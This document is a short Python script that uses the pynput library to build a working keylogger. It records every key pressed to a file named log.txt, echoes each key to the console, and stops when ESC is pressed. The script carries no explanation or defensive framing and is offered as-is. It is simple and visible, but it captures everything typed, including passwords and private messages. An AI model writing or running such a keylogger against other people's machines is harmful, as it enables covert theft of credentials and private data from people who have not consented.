import pynput
from pynput.keyboard import Key, Listener

keys = [] #Initialize list of keys that have been pressed

def press(key):
    keys.append(key)
    if key == Key.enter: #if enter is pressed, make a new line in the file
        keys.append('\n')

    write_to_log(keys)

    try: #if standard character is pressed
        print('Alphanumeric key {0} pressed'.format(key.char))

    except AttributeError: #if special character is pressed
        print('Special key {0} pressed'.format(key))


def write_to_log(keys):
    with open("log.txt", "w") as l: #open log.txt for writing

        for key in keys: #iterate through list of keys
            key_string = str(key).replace("'","") #convert keycode to string and remove single quotes from log
            l.write(key_string) #write the key to the log


def release(key):
    print('{0} released'.format(key))

    if key == Key.esc:#end keylogging if ESC is pressed
        return False


with Listener(on_press = press, on_release = release) as listener:
    listener.join()
